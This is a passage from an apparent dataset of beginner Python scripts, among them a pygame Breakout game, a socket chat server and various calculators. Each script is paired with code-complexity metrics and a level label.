
""""""
    This is a simple Ball class for respresenting a ball 
    in the game. 
""""""


class Ball(object):
    def __init__(self, screen, radius, x, y):
        self.__screen = screen
        self._radius = radius
        self._xLoc = x
        self._yLoc = y
        self.__xVel = 7
        self.__yVel = 2
        w, h = pygame.display.get_surface().get_size()
        self.__width = w
        self.__height = h

    def getXVel(self):
        return self.__xVel

    def getYVel(self):
        return self.__yVel

    def draw(self):
        """"""
        draws the ball onto screen.
        """"""
        pygame.draw.circle(screen, (255, 0, 0), (self._xLoc, self._yLoc), self._radius)

    def update(self, paddle, brickwall):
        """"""
        moves the ball at the screen.
        contains some collision detection.
        """"""
        self._xLoc += self.__xVel
        self._yLoc += self.__yVel
        # left screen wall bounce
        if self._xLoc <= self._radius:
            self.__xVel *= -1
        # right screen wall bounce
        elif self._xLoc >= self.__width - self._radius:
            self.__xVel *= -1
        # top wall bounce
        if self._yLoc <= self._radius:
            self.__yVel *= -1
        # bottom drop out
        elif self._yLoc >= self.__width - self._radius:
            return True

        # for bouncing off the bricks.
        if brickwall.collide(self):
            self.__yVel *= -1

        # collision detection between ball and paddle
        paddleY = paddle._yLoc
        paddleW = paddle._width
        paddleH = paddle._height
        paddleX = paddle._xLoc
        ballX = self._xLoc
        ballY = self._yLoc

        if ((ballX + self._radius) >= paddleX and ballX <= (paddleX + paddleW)) and (
            (ballY + self._radius) >= paddleY and ballY <= (paddleY + paddleH)
        ):
            self.__yVel *= -1

        return False


""""""
    Simple class for representing a paddle
""""""


class Paddle(object):
    def __init__(self, screen, width, height, x, y):
        self.__screen = screen
        self._width = width
        self._height = height
        self._xLoc = x
        self._yLoc = y
        w, h = pygame.display.get_surface().get_size()
        self.__W = w
        self.__H = h

    def draw(self):
        """"""
        draws the paddle onto screen.
        """"""
        pygame.draw.rect(
            screen, (0, 0, 0), (self._xLoc, self._yLoc, self._width, self._height), 0
        )

    def update(self):
        """"""
        moves the paddle at the screen via mouse
        """"""
        x, y = pygame.mouse.get_pos()
        if x >= 0 and x <= (self.__W - self._width):
            self._xLoc = x


""""""
    This class represents a simple Brick class.
    For representing bricks onto screen.
""""""


class Brick(pygame.sprite.Sprite):
    def __init__(self, screen, width, height, x, y):
        self.__screen = screen
        self._width = width
        self._height = height
        self._xLoc = x
        self._yLoc = y
        w, h = pygame.display.get_surface().get_size()
        self.__W = w
        self.__H = h
        self.__isInGroup = False

    def draw(self):
        """"""
        draws the brick onto screen.
        color: rgb(56, 177, 237)
        """"""
        pygame.draw.rect(
            screen,
            (56, 177, 237),
            (self._xLoc, self._yLoc, self._width, self._height),
            0,
        )

    def add(self, group):
        """"""
        adds this brick to a given group.
        """"""
        group.add(self)
        self.__isInGroup = True

    def remove(self, group):
        """"""
        removes this brick from the given group.
        """"""
        group.remove(self)
        self.__isInGroup = False

    def alive(self):
        """"""
        returns true when this brick belongs to the brick wall.
        otherwise false
        """"""
        return self.__isInGroup

    def collide(self, ball):
        """"""
        collision detection between ball and this brick
        """"""
        brickX = self._xLoc
        brickY = self._yLoc
        brickW = self._width
        brickH = self._height
        ballX = ball._xLoc
        ballY = ball._yLoc
        ballXVel = ball.getXVel()
        ballYVel = ball.getYVel()

        if (
            (ballX + ball._radius) >= brickX
            and (ballX + ball._radius) <= (brickX + brickW)
        ) and (
            (ballY - ball._radius) >= brickY
            and (ballY - ball._radius) <= (brickY + brickH)
        ):
            return True
        else:
            return False


""""""
    This is a simple class for representing a 
    brick wall.
""""""


class BrickWall(pygame.sprite.Group):
    def __init__(self, screen, x, y, width, height):
        self.__screen = screen
        self._x = x
        self._y = y
        self._width = width
        self._height = height
        self._bricks = []

        X = x
        Y = y
        for i in range(3):
            for j in range(4):
                self._bricks.append(Brick(screen, width, height, X, Y))
                X += width + (width / 7.0)
            Y += height + (height / 7.0)
            X = x

    def add(self, brick):
        """"""
        adds a brick to this BrickWall (group)
        """"""
        self._bricks.append(brick)

    def remove(self, brick):
        """"""
        removes a brick from this BrickWall (group)
        """"""
        self._bricks.remove(brick)

    def draw(self):
        """"""
        draws all bricks onto screen.
        """"""
        for brick in self._bricks:
            if brick != None:
                brick.draw()

    def update(self, ball):
        """"""
        checks collision between ball and bricks.
        """"""
        for i in range(len(self._bricks)):
            if (self._bricks[i] != None) and self._bricks[i].collide(ball):
                self._bricks[i] = None

        # removes the None-elements from the brick list.
        for brick in self._bricks:
            if brick is None:
                self._bricks.remove(brick)

    def hasWin(self):
        """"""
        Has player win the game?
        """"""
        return len(self._bricks) == 0

    def collide(self, ball):
        """"""
        check collisions between the ball and
        any of the bricks.
        """"""
        for brick in self._bricks:
            if brick.collide(ball):
                return True
        return False


# The game objects ball, paddle and brick wall
ball = Ball(screen, 25, random.randint(1, 700), 250)
paddle = Paddle(screen, 100, 20, 250, 450)
brickWall = BrickWall(screen, 25, 25, 150, 50)

isGameOver = False  # determines whether game is lose
gameStatus = True  # game is still running

score = 0  # score for the game.

pygame.display.set_caption(""Brickout-game"")

# Loop until the user clicks the close button.
done = False

# Used to manage how fast the screen updates
clock = pygame.time.Clock()

# for displaying text in the game
pygame.font.init()  # you have to call this at the start,
# if you want to use this module.

# message for game over
mgGameOver = pygame.font.SysFont(""Comic Sans MS"", 40)

# message for winning the game.
mgWin = pygame.font.SysFont(""Comic Sans MS"", 40)

# message for score
mgScore = pygame.font.SysFont(""Comic Sans MS"", 40)

textsurfaceGameOver = mgGameOver.render(""Game Over!"", False, (0, 0, 0))
textsurfaceWin = mgWin.render(""You win!"", False, (0, 0, 0))
textsurfaceScore = mgScore.render(""score: "" + str(score), False, (0, 0, 0))

# -------- Main Program Loop -----------
while not done:
    # --- Main event loop
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            done = True

    # --- Game logic should go here

    # --- Screen-clearing code goes here

    # Here, we clear the screen to white. Don't put other drawing commands
    # above this, or they will be erased with this command.

    # If you want a background image, replace this clear with blit'ing the
    # background image.
    screen.fill(WHITE)

    # --- Drawing code should go here

    """"""
        Because I use OOP in the game logic and the drawing code,
        are both in the same section.
    """"""
    if gameStatus:

        # first draws ball for appropriate displaying the score.
        brickWall.draw()

        # for counting and displaying the score
        if brickWall.collide(ball):
            score += 10
        textsurfaceScore = mgScore.render(""score: "" + str(score), False, (0, 0, 0))
        screen.blit(textsurfaceScore, (300, 0))

        # after scoring. because hit bricks are removed in the update-method
        brickWall.update(ball)

        paddle.draw()
        paddle.update()

        if ball.update(paddle, brickWall):
            isGameOver = True
            gameStatus = False

        if brickWall.hasWin():
            gameStatus = False

        ball.draw()

    else:  # game isn't running.
        if isGameOver:  # player lose
            screen.blit(textsurfaceGameOver, (0, 0))
            textsurfaceScore = mgScore.render(""score: "" + str(score), False, (0, 0, 0))
            screen.blit(textsurfaceScore, (300, 0))
        elif brickWall.hasWin():  # player win
            screen.blit(textsurfaceWin, (0, 0))
            textsurfaceScore = mgScore.render(""score: "" + str(score), False, (0, 0, 0))
            screen.blit(textsurfaceScore, (300, 0))

    # --- Go ahead and update the screen with what we've drawn.
    pygame.display.flip()

    # --- Limit to 60 frames per second
    clock.tick(60)

# Close the window and quit.
pygame.quit()
",10214,205,199,79,40,33,79,21.0,59,64,12,122.0,84,,186,579.9742135220697,1224.803025134135,8.714285714285714,bajo,Yes,False,True,Very High,id146
question 2.py,""""""" Write a method/function DISPLAYWORDS() in python to read lines
 from a text file STORY.TXT,
 using read function
and display those words, which are less than 4 characters. """"""


print(""Hey!! You can print the word which are less then 4 characters"")        

def display_words(file_path):

    try:
        with open(file_path) as F:
            words = F.read().split()
            words_less_than_40 = list( filter(lambda word: len(word) < 4, words) )

            for word in words_less_than_40:
                print(word)
        
        return ""The total number of the word's count which has less than 4 characters"", (len(words_less_than_40)) 
    
    except FileNotFoundError:
        print(""File not found"")

print(""Just need to pass the path of your file.."")

file_path = input(""Please, Enter file path: "")

if __name__ == ""__main__"":
    
    print(display_words(file_path))
                




",946,17,15,16,0,0,4,1.0,3,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,True,False,Low,id147
Battery_notifier.py,"from plyer import notification  # pip install plyer
import psutil  # pip install psutil

# psutil.sensors_battery() will return the information related to battery
battery = psutil.sensors_battery()

# battery percent will return the current battery prcentage
percent = battery.percent
charging = (
    battery.power_plugged
)

# Notification(title, description, duration)--to send
# notification to desktop
# help(Notification)
if charging:
    if percent == 100:
        charging_message = ""Unplug your Charger""
    else:
        charging_message = ""Charging""
else:
    charging_message = ""Not Charging""
message = str(percent) + ""% Charged\n"" + charging_message

notification.notify(""Battery Information"", message, timeout=10)
",728,14,16,4,7,5,0,0.0,0,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,alto,No,False,False,Low,id148
stackF_Harsh2255.py,"# Python program for implementation of stack

# import maxsize from sys module
# Used to return -infinite when stack is empty
from sys import maxsize

# Function to create a stack. It initializes size of stack as 0
def createStack():
    stack = []
    return stack


# Stack is empty when stack size is 0
def isEmpty(stack):
    return len(stack) == 0


# Function to add an item to stack. It increases size by 1
def push(stack, item):
    stack.append(item)
    print(item + "" pushed to stack "")


# Function to remove an item from stack. It decreases size by 1
def pop(stack):
    if isEmpty(stack):
        return str(-maxsize - 1)  # return minus infinite

    return stack.pop()


# Function to return the top from stack without removing it
def peek(stack):
    if isEmpty(stack):
        return str(-maxsize - 1)  # return minus infinite
    return stack[len(stack) - 1]


# Driver program to test above functions
stack = createStack()
push(stack, str(10))
push(stack, str(20))
push(stack, str(30))
print(pop(stack) + "" popped from stack"")
",1047,22,22,13,11,9,0,5.0,7,8,4,14.0,13,,22,56.1057163358342,89.92418250750748,2.1538461538461537,alto,No,False,False,Low,id149
server.py,"# Client and Server Must be connected to same network
# import socket module
import socket

# create TCP/IP socket
s = socket.socket()
# get the according IP address
ip = socket.gethostbyname(socket.gethostname())
# binding ip address and port
s.bind((ip, 12345))
# listen for incoming connections (server mode) with 3 connection at a time
s.listen(3)
# print your ip address
print(""Server ip address:"", ip)
while True:
    # waiting for a connection establishment
    print(""waiting for a connection"")
    connection, client_address = s.accept()
    try:
        # show connected client
        print(""connected from"", client_address)
        # sending acknowledgement to client that you are connected
        connection.send(str(""Now You are connected"").encode(""utf-8""))

        # receiving the message
        while True:
            data = connection.recv(1024).decode(""utf-8"")
            if data:
                # message from client
                print(list(client_address)[0], end="""")
                print("": %s"" % data)
                # Enter your message to send to client
                new_data = str(input(""You: "")).encode(""utf-8"")
                connection.send(new_data)
    finally:
        # Close connection
        connection.close()
",1261,21,21,2,14,14,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id150
Print_List_of_Even_Numbers.py,"# Very sort method to creat list of even number form a given list
# Advance-Python
list_number = list(map(int, input().split()))
even_list = [i for i in list_number if i % 2 == 0]
print(even_list)
exit()  # Another one
n = int(input(""Enter the required range : ""))  # user input
list = []

if n < 0:
    print(""Not a valid number, please enter a positive number!"")
else:
    for i in range(0, n + 1):
        if i % 2 == 0:
            list.append(
                i
            )  # appending items to the initialised list getting from the 'if' statement

print(list)
",588,13,15,2,5,2,0,0.0,0,6,4,12.0,7,11.0,18,27.651484454403228,62.26976913547136,3.4285714285714284,alto,No,True,False,Low,id151
calc_area.py,"# Author: PrajaktaSathe
# Program to calculate the area of - square, rectangle, circle, and triangle -
import math as m


def main():
    shape = int(
        input(
            ""Enter 1 for square, 2 for rectangle, 3 for circle, 4 for triangle, 5 for cylinder, 6 for cone, or 7 for sphere: ""
        )
    )
    if shape == 1:
        side = float(input(""Enter length of side: ""))
        print(""Area of square = "" + str(side ** 2))
    elif shape == 2:
        l = float(input(""Enter length: ""))
        b = float(input(""Enter breadth: ""))
        print(""Area of rectangle = "" + str(l * b))
    elif shape == 3:
        r = float(input(""Enter radius: ""))
        print(""Area of circle = "" + str(m.pi * r * r))
    elif shape == 4:
        base = float(input(""Enter base: ""))
        h = float(input(""Enter height: ""))
        print(""Area of rectangle = "" + str(0.5 * base * h))
    elif shape == 5:
        r = float(input(""Enter radius: ""))
        h = float(input(""Enter height: ""))
        print(""Area of cylinder = "" + str(m.pow(r, 2) * h * m.pi))
    elif shape == 6:
        r = float(input(""Enter radius: ""))
        h = float(input(""Enter height: ""))
        print(""Area of cone = "" + str(m.pow(r, 2) * h * 1 / 3 * m.pi))
    elif shape == 7:
        r = float(input(""Enter radius: ""))
        print(""Area of sphere = "" + str(m.pow(r, 3) * 4 / 3 * m.pi))
    else:
        print(""You have selected wrong choice."")

    restart = input(""Would you like to calculate the area of another object? Y/N : "")

    if restart.lower().startswith(""y""):
        main()
    elif restart.lower().startswith(""n""):
        quit()


main()
",1633,36,40,6,2,2,0,1.0,10,29,5,58.0,40,,87,224.4867642699313,477.7912193806817,3.625,medio,No,True,False,Medium,id152
Grocery calculator.py,"'''This will be a Python script that functions as a grocery calculator. It will take in key-value pairs for items
and their prices, and return the subtotal and total, and can print out the list for you for when you're ready to
take it to the store!'''

'''Algorithm:
1. User enters key-value pairs that are added into a dict.
2. Users tells script to return total, subtotal, and key-value pairs in a nicely formatted list.'''

#Object = GroceryList
#Methods = addToList, Total, Subtotal, returnList
class GroceryList(dict):

	def __init__(self):
		self = {}

	def addToList(self, item, price):
        
		self.update({item:price})

	def Total(self):
		total = 0
		for items in self:
			total += (self[items])*.07 + (self[items])
		return total

	def Subtotal(self):
		subtotal = 0
		for items in self:
			subtotal += self[items]
		return subtotal

	def returnList(self):
		return self

'''Test list should return:
Total = 10.70
Subtotal = 10
returnList = {""milk"":4, ""eggs"":3, ""kombucha"":3}
'''
List1 = GroceryList()

List1.addToList(""milk"",4)
List1.addToList(""eggs"", 3)
List1.addToList(""kombucha"", 3)


print(List1.Total())
print(List1.Subtotal())
print(List1.returnList())

#*****************************************************
print()
#*****************************************************


List2 = GroceryList()

List2.addToList('cheese', 7.49)
List2.addToList('wine', 25.36)
List2.addToList('steak', 17.64)

print(List2.Total())
print(List2.Subtotal())
print(List2.returnList())
",1485,36,32,17,4,4,11,5.0,9,4,2,8.0,8,,12,26.0,39.86313713864836,1.0,alto,Yes,False,False,Low,id153
get_info_remoute_srv.py,"# Script Name   : get_info_remoute_srv.py
# Author        : Pavel Sirotkin
# Created       : 3th April 2016
# Last Modified	: -
# Version       : 1.0.0

# Modifications :

# Description   : this will get info about remoute server on linux through ssh connection. Connect these servers must be through keys

import subprocess

HOSTS = (""proxy1"", ""proxy"")

COMMANDS = (""uname -a"", ""uptime"")

for host in HOSTS:
    result = []
    for command in COMMANDS:
        ssh = subprocess.Popen(
            [""ssh"", ""%s"" % host, command],
            shell=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        result.append(ssh.stdout.readlines())
    print(""--------------- "" + host + "" --------------- "")
    for res in result:
        if not res:
            print(ssh.stderr.readlines())
            break
        else:
            print(res)
",881,15,20,6,7,7,0,0.0,0,4,3,,6,,11,20.264662506490406,34.86917501586544,1.75,alto,No,False,False,Low,id154
wiki_random.py,"""""""Author Anurag Kumar(mailto:anuragkumarak95@gmail.com)
Module for Fetching Random Wiki Pages and asking user for opening one of them

Python:
  - 3.5

Requirements:
  - requests
  - json
  - webbrowser

Usage:
  - $python3 wiki_random.py

enter index of article you would like to see, or 'r' for retry and 'n' for exit.
""""""
import requests
import webbrowser

page_count = 10
url = (
    ""https://en.wikipedia.org/w/api.php?action=query&list=random&rnnamespace=0&rnlimit=""
    + str(page_count)
    + ""&format=json""
)


def load():
    response = requests.get(url)
    if response.ok:
        jsonData = response.json()[""query""][""random""]
        print(""10 Random generted WIKI pages..."")
        for idx, j in enumerate(jsonData):
            print(str(idx) + "": "", j[""title""])
        i = input(
            ""Which page you want to see, enter index..[r: for retry,n: exit]?""
        ).lower()
        if i == ""r"":
            print(""Loading randoms again..."")
        elif i == ""n"":
            print(""Auf Wiedersehen!"")
            return
        else:
            try:
                jsonData[int(i)][""id""]
            except Exception:
                raise Exception(""Wrong Input..."")
            print(""taking you to the browser..."")
            webbrowser.get().open(
                ""https://en.wikipedia.org/wiki?curid="" + str(jsonData[int(i)][""id""])
            )
        load()
    else:
        response.raise_for_status()


if __name__ == ""__main__"":
    load()
",1478,30,37,9,0,0,12,,6,7,2,14.0,13,,21,50.1057163358342,82.0447025077789,1.0769230769230769,alto,No,True,False,Low,id155
Timetable_Operations.py,"##Clock in pt2thon##

t1 = input(""Init schedule : "")  # first schedule
HH1 = int(t1[0] + t1[1])
MM1 = int(t1[3] + t1[4])
SS1 = int(t1[6] + t1[7])

t2 = input(""Final schedule : "")  # second schedule
HH2 = int(t2[0] + t2[1])
MM2 = int(t2[3] + t2[4])
SS2 = int(t2[6] + t2[7])

tt1 = (HH1 * 3600) + (MM1 * 60) + SS1  # total schedule 1
tt2 = (HH2 * 3600) + (MM2 * 60) + SS2  # total schedule 2
tt3 = tt2 - tt1  # difference between tt2 e tt1

# Part Math
if tt3 < 0:
    # If the difference between tt2 e tt1 for negative :

    a = 86400 - tt1  # 86400 is seconds in 1 day;
    a2 = a + tt2  # a2 is the difference between 1 day e the <hours var>;
    Ht = a2 // 3600  # Ht is hours calculated;

    a = a2 % 3600  # Convert 'a' in seconds;
    Mt = a // 60  # Mt is minutes calculated;
    St = a % 60  # St is seconds calculated;

else:
    # If the difference between tt2 e tt1 for positive :

    Ht = tt3 // 3600  # Ht is hours calculated;
    z = tt3 % 3600  # 'z' is tt3 converting in hours by seconds

    Mt = z // 60  # Mt is minutes calculated;
    St = tt3 % 60  # St is seconds calculated;

# special condition below :
if Ht < 10:
    h = ""0"" + str(Ht)
    Ht = h
if Mt < 10:
    m = ""0"" + str(Mt)
    Mt = m
if St < 10:
    s = ""0"" + str(St)
    St = s
# add '0' to the empty spaces (caused by previous operations) in the final result!

print(
    ""final result is :"", str(Ht) + "":"" + str(Mt) + "":"" + str(St)
)  # final result (formatted in clock)
",1459,33,35,11,22,6,0,0.0,0,36,6,72.0,49,,108,290.6305573659721,624.3868490606633,4.408163265306122,medio,No,True,False,Medium-High,id156
Program of Reverse of any number.py,"num = int(input(""enter any Number""))
rev = 0
while num > 0:
    Rem = num % 10
    num = num // 10
    rev = rev * 10 + Rem
print(""The Reverse of the number"", rev)
##################
# could also simply do this another way

num = input()
print(int(num[::-1]))
",260,10,9,1,2,2,0,0.0,0,6,6,11.0,7,,17,35.161259458730164,62.907475208398566,4.714285714285714,alto,No,True,False,Low,id157
FindingResolutionOfAnImage.py,"def jpeg_res(filename):
   """"""""This function prints the resolution of the jpeg image file passed into it""""""

   # open image for reading in binary mode
   with open(filename,'rb') as img_file:

       # height of image (in 2 bytes) is at 164th position
       img_file.seek(163)

       # read the 2 bytes
       a = img_file.read(2)

       # calculate height
       height = (a[0] << 8) + a[1]

       # next 2 bytes is width
       a = img_file.read(2)

       # calculate width
       width = (a[0] << 8) + a[1]

   print(""The resolution of the image is"",width,""x"",height)

jpeg_res(""img1.jpg"")
",599,10,9,8,6,7,0,1.0,1,4,2,8.0,7,,12,21.651484454403228,38.03910001730775,1.1428571428571428,alto,No,False,False,,id158
kmp_str_search.py,"""""""Author Anurag Kumar(mailto:anuragkumarak95@gmail.com)
    The Knuth-Morris-Pratt Algorithm for finding a pattern within a piece of te$
    with complexity O(n + m)
    1) Preprocess pattern to identify any suffixes that are identical to prefix$
        This tells us where to continue from if we get a mismatch between a cha$
        and the text.
    2) Step through the text one character at a time and compare it to a charac$
        updating our location within the pattern if necessary
""""""


def kmp(pattern, text, len_p=None, len_t=None):
    # 1) Construct the failure array
    failure = [0]
    i = 0
    for index, char in enumerate(pattern[1:]):
        if pattern[i] == char:
            i += 1
        else:
            i = 0
        failure.append(i)

    # 2) Step through text searching for pattern
    i, j = 0, 0  # index into text, pattern
    while i < len(text):
        if pattern[j] == text[i]:
            if j == (len(pattern) - 1):
                return True
            i += 1
            j += 1

        # if this is a prefix in our pattern
        # just go back far enough to continue
        elif failure[j] > 0:
            j = failure[j] - 1
        else:
            i += 1
    return False


if __name__ == ""__main__"":
    # Test 1)
    pattern = ""abc1abc12""
    text1 = ""alskfjaldsabc1abc1abc12k23adsfabcabc""
    text2 = ""alskfjaldsk23adsfabcabc""
    assert kmp(pattern, text1) and not kmp(pattern, text2)

    # Test 2)
    pattern = ""ABABX""
    text = ""ABABZABABYABABX""
    assert kmp(pattern, text)
",1542,30,29,7,7,6,9,,7,14,7,27.0,18,,41,94.71013448036484,190.3981037807637,5.25,medio,No,False,False,Low-Medium,id159
FIND FACTORIAL OF A NUMBER.py,"# Python program to find the factorial of a number provided by the user.

def factorial(n):
	if n < 0:         # factorial of number less than 0 is not possible
		return ""Oops!Factorial Not Possible""
	elif n == 0:    # 0! = 1; when n=0 it returns 1 to the function which is calling it previously. 
		return 1
	else:
		return n*factorial(n-1)  
#Recursive function. At every iteration ""n"" is getting reduced by 1 until the ""n"" is equal to 0.

n = int(input(""Enter a number: "")) # asks the user for input 
print(factorial(n))    # function call
",543,9,9,2,6,2,0,1.0,3,4,4,8.0,4,,12,16.0,36.0,4.0,alto,No,True,False,Low,id160
pigeonhole_sort.py,"# know what is Pigeonhole_principle
# https://www.youtube.com/watch?v=IeTLZPNIPJQ


def pigeonhole_sort(a):

    # (number of pigeonholes we need)
    my_min = min(a)
    my_max = max(a)
    size = my_max - my_min + 1

    # total pigeonholes
    holes = [0] * size

    # filling up the pigeonholes.
    for x in a:
        holes[x - my_min] += 1

    # Put the elements back into the array in order.
    i = 0
    for count in range(size):
        while holes[count] > 0:
            holes[count] -= 1
            a[i] = count + my_min
            i += 1


a = [10, 3, 2, 7, 4, 6, 8]

# list only integers
print(pigeonhole_sort(a))
print(a)
",643,16,16,9,7,7,0,1.0,4,9,4,18.0,13,17.0,27,56.1057163358342,110.36149671375918,2.769230769230769,alto,No,False,False,Low,id161
binod.py,"# patch-1
# import os
# The OS module in python provides functions for interacting with the operating system

# patch-3
# function to check if 'binod' is present in the file.
# def checkBinod(file):
# =======

# def checkBinod(file):       #this function will check there is any 'Binod' text in file or not
#     with open(file, ""r"") as f: #we are opening file in read mode and using 'with' so need to take care of close()
# =======
import time
import os

# Importing our Bindoer
print(""To Kaise Hai Ap Log!"")
time.sleep(1)
print(""Chaliye Binod Karte Hai!"")


def checkBinod(file):  # Trying to find Binod In File Insted Of Manohar Ka Kotha
    # master
    with open(file, ""r"") as f:
        # master
        fileContent = f.read()
    if ""binod"" in fileContent.lower():
        print(f""**************Congratulations Binod found in {f}********************"")
        return True
    else:
        return False


if __name__ == ""__main__"":
    print(""************binod Detector********************"")
    dir_contents = os.listdir()
    for item in dir_contents:
        if item.endswith(""txt""):
            ans = checkBinod(item)
            if ans is False:
                print(""Binod not found Try Looking In Manohar Ka Kotha!!"")
",1233,21,21,7,14,13,0,1.0,2,3,3,6.0,6,,9,20.264662506490406,28.529325012980813,1.5,alto,No,False,False,Low,id162
chicks_n_rabs.py,"""""""
Author Anurag Kumar(mailto:anuragkumarak95@gmail.com)

Module to solve a classic ancient Chinese puzzle:
We count 35 heads and 94 legs among the chickens and rabbits in a farm. 
How many rabbits and how many chickens do we have?

""""""


def solve(num_heads, num_legs):
    ns = ""No solutions!""
    for i in range(num_heads + 1):
        j = num_heads - i
        if 2 * i + 4 * j == num_legs:
            return i, j
    return ns, ns


if __name__ == ""__main__"":
    numheads = 35
    numlegs = 94

    solutions = solve(numheads, numlegs)
    print(solutions)
",565,13,12,7,0,0,6,1.0,3,7,4,14.0,12,,21,51.01955000865388,84.0,2.333333333333333,alto,No,False,False,Low,id163
move_to_directory.py,"import os
import shutil

ext = {
    ""web"": ""css less scss wasm "",
    ""audio"": ""aac aiff ape au flac gsm it m3u m4a mid mod mp3 mpa pls ra s3m sid wav wma xm "",
    ""code"": ""c cc class clj cpp cs cxx el go h java lua m m4 php pl po py rb rs swift vb vcxproj xcodeproj xml diff patch html js "",
    ""slide"": ""ppt odp "",
    ""sheet"": ""ods xls xlsx csv ics vcf "",
    ""image"": ""3dm 3ds max bmp dds gif jpg jpeg png psd xcf tga thm tif tiff ai eps ps svg dwg dxf gpx kml kmz webp "",
    ""archiv"": ""7z a apk ar bz2 cab cpio deb dmg egg gz iso jar lha mar pea rar rpm s7z shar tar tbz2 tgz tlz war whl xpi zip zipx xz pak "",
    ""book"": ""mobi epub azw1 azw3 azw4 azw6 azw cbr cbz "",
    ""text"": ""doc docx ebook log md msg odt org pages pdf rtf rst tex txt wpd wps "",
    ""exec"": ""exe msi bin command sh bat crx "",
    ""font"": ""eot otf ttf woff woff2 "",
    ""video"": ""3g2 3gp aaf asf avchd avi drc flv m2v m4p m4v mkv mng mov mp2 mp4 mpe mpeg mpg mpv mxf nsv ogg ogv ogm qt rm rmvb roq srt svi vob webm wmv yuv "",
}

for key, value in ext.items():
    value = value.split()
    ext[key] = value


def add_to_dir(ex, src_path, path):
    file_with_ex = os.path.basename(src_path)
    file_without_ex = file_with_ex[: file_with_ex.find(ex) - 1]
    for cat, extensions in ext.items():
        if ex in extensions:
            os.chdir(path)
            dest_path = path + ""\\"" + cat
            if cat in os.listdir():
                try:
                    shutil.move(src_path, dest_path)
                except shutil.Error:
                    renamed_file = rename(file_without_ex, ex, dest_path)
                    os.chdir(path)
                    os.rename(file_with_ex, renamed_file)
                    os.chdir(dest_path)
                    shutil.move(path + ""\\"" + renamed_file, dest_path)
            else:
                os.mkdir(cat)

                try:
                    shutil.move(src_path, dest_path)
                except Exception as e:
                    print(e)
                if os.path.exists(src_path):
                    os.unlink(src_path)


def rename(search, ex, dest_path):
    count = 0
    os.chdir(dest_path)
    for filename in os.listdir():
        if filename.find(search, 0, len(search) - 1):
            count = count + 1

    return search + str(count) + ""."" + ex
",2312,39,50,8,0,0,0,2.0,10,12,3,24.0,20,,36,91.19344939991072,162.84823041805248,1.8,bajo,No,False,False,Low,id164
batch_file_rename.py,"# batch_file_rename.py
# Created: 6th August 2012

""""""
This will batch rename a group of files in a given directory,
once you pass the current and new extensions
""""""

# just checking
__author__ = ""Craig Richards""
__version__ = ""1.0""

import argparse
import os


def batch_rename(work_dir, old_ext, new_ext):
    """"""
    This will batch rename a group of files in a given directory,
    once you pass the current and new extensions
    """"""
    # files = os.listdir(work_dir)
    for filename in os.listdir(work_dir):
        # Get the file extension
        split_file = os.path.splitext(filename)
        # Unpack tuple element
        root_name, file_ext = split_file
        # Start of the logic to check the file extensions, if old_ext = file_ext
        if old_ext == file_ext:
            # Returns changed name of the file with new extention
            newfile = root_name + new_ext

            # Write the files
            os.rename(os.path.join(work_dir, filename), os.path.join(work_dir, newfile))
    print(""rename is done!"")
    print(os.listdir(work_dir))


def get_parser():
    parser = argparse.ArgumentParser(
        description=""change extension of files in a working directory""
    )
    parser.add_argument(
        ""work_dir"",
        metavar=""WORK_DIR"",
        type=str,
        nargs=1,
        help=""the directory where to change extension"",
    )
    parser.add_argument(
        ""old_ext"", metavar=""OLD_EXT"", type=str, nargs=1, help=""old extension""
    )
    parser.add_argument(
        ""new_ext"", metavar=""NEW_EXT"", type=str, nargs=1, help=""new extension""
    )
    return parser


def main():
    """"""
    This will be called if the script is directly invoked.
    """"""
    # adding command line argument
    parser = get_parser()
    args = vars(parser.parse_args())

    # Set the variable work_dir with the first argument passed
    work_dir = args[""work_dir""][0]
    # Set the variable old_ext with the second argument passed
    old_ext = args[""old_ext""][0]
    if old_ext and old_ext[0] != ""."":
        old_ext = ""."" + old_ext
    # Set the variable new_ext with the third argument passed
    new_ext = args[""new_ext""][0]
    if new_ext and new_ext[0] != ""."":
        new_ext = ""."" + new_ext

    batch_rename(work_dir, old_ext, new_ext)


if __name__ == ""__main__"":
    main()
",2397,35,44,14,13,13,11,3.0,9,9,4,18.0,13,,27,56.1057163358342,110.36149671375918,2.769230769230769,alto,No,False,False,Low,id165
internet_connection_py3.py,"from __future__ import print_function

import os
import urllib.request

from selenium import webdriver

print(""Testing Internet Connection"")
print()
try:
    urllib.request.urlopen(
        ""http://google.com"", timeout=2
    )  # Tests if connection is up and running
    print(""Internet is working fine!"")
    print()
    question = input(""Do you want to open a website? (Y/N): "")
    if question == ""Y"":
        print()
        search = input(""Input website to open (http://website.com) : "")
    else:
        os._exit(0)

except urllib.error.URLError:
    print(""No internet connection!"")  # Output if no connection

browser = webdriver.Firefox()
browser.get(search)
os.system(""cls"")  # os.system('clear') if Linux
print(""[+] Website "" + search + "" opened!"")
browser.close()
",778,23,25,5,3,0,0,,0,3,2,6.0,6,8.0,9,17.509775004326936,27.0,1.0,medio,No,True,False,Low,id166
birthdays.py,"birthdays = {'Alice': 'Apr 1', 'Bob': 'Dec 12', 'Carol': 'Mar 4'}
while True:
   
   print('Enter a name: (blank to quit)')
   name = input()
   if name == '':
      break
   if name in birthdays:
      print(birthdays[name] + ' is the birthday of ' + name)
   else:
      print('I do not have birthday information for ' + name)
   print('What is their birthday?')
   bday = input()
   birthdays[name] = bday
   print('Birthday database updated.')
",448,15,14,1,0,0,0,0.0,0,5,3,10.0,7,,15,24.406371956566694,49.82892142331044,2.142857142857143,medio,No,True,False,Low,id167
Mp3_media_player.py,"# its very amazing
import os
from tkinter.filedialog import askdirectory

import pygame
from mutagen.id3 import ID3
from tkinter import *

root = Tk()
root.minsize(300, 300)


listofsongs = []
realnames = []

v = StringVar()
songlabel = Label(root, textvariable=v, width=35)

index = 0


def directorychooser():

    directory = askdirectory()
    os.chdir(directory)

    for files in os.listdir(directory):
        if files.endswith("".mp3""):

            realdir = os.path.realpath(files)
            audio = ID3(realdir)
            realnames.append(audio[""TIT2""].text[0])

            listofsongs.append(files)

    pygame.mixer.init()
    pygame.mixer.music.load(listofsongs[0])
    # pygame.mixer.music.play()


directorychooser()


def updatelabel():
    global index
    global songname
    v.set(realnames[index])
    # return songname


def nextsong(event):
    global index
    index += 1
    pygame.mixer.music.load(listofsongs[index])
    pygame.mixer.music.play()
    updatelabel()


